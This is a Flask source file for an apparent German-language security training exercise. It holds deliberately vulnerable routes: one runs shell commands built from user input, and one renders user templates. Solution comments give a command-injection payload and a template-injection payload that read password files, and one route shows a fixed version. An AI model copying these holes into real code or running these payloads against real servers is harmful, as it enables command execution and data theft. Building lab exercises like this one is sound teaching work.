from crypt import methods
import os
import subprocess

from flask import Flask, render_template, request, render_template_string, flash

app = Flask(__name__)


@app.route("/command_injection_1")
def command_injection_1():
    return render_template("command_injection_1.html", result="")


@app.route("/command_injection_1_fixed")
def command_injection_1_fixed():
    return render_template("command_injection_1_fixed.html", result="")


@app.route("/command_injection_1", methods=["POST"])
def command_injection_1_post():
    name = request.form["name"]
    try:
        result = subprocess.check_output(
            f"echo Hallo {name}, ich habe dich bereits erwartet.", shell=True
        )
        return render_template(
            "command_injection_1.html", result=result.decode("utf-8")
        )
    except subprocess.CalledProcessError as e:
        print(e)
        return render_template(
            "command_injection_1.html", result="Dieser text existiert nicht."
        )
    # solution ;cat ~/passwordLVL1.txt #


@app.route("/command_injection_1_fixed", methods=["POST"])
def command_injection_1_post_fixed():
    return render_template(
        "command_injection_1_fixed.html",
        result=f"Hallo {request.form['name']}, ich habe dich bereits erwartet.",
    )


@app.route("/ssti_1")
def ssti_1():
    if request.args.get("hex"):
        val = request.args.get("hex")

        if val.startswith("{{") and val.endswith("}}"):
            return render_template_string("{% include 'ssti_1.html' %}" + val)

        if len(val) != 6:
            return render_template(
                "ssti_1.html", result="Der HEX-Wert muss aus genau 6 Zeichen bestehen."
            )
        else:
            for c in val:
                try:
                    int(c, 16)
                except ValueError:
                    return render_template(
                        "ssti_1.html",
                        result="Nur Zahlen von 0-9 und Buchstaben von A-F sind erlaubt.",
                    )

            r = int(val[:2], 16)
            g = int(val[2:4], 16)
            b = int(val[4:], 16)
            return render_template("ssti_1.html", result=f"R = {r}, G = {g}, B = {b}")

    else:
        return render_template("ssti_1.html", result="")

    # solution
    # hex={{url_for.__class__.__base__.__subclasses__()[84].load_module("os").popen("cat ~/passwordLVL2.txt").read()}}


if __name__ == "__main__":
    app.run(host="0.0.0.0")
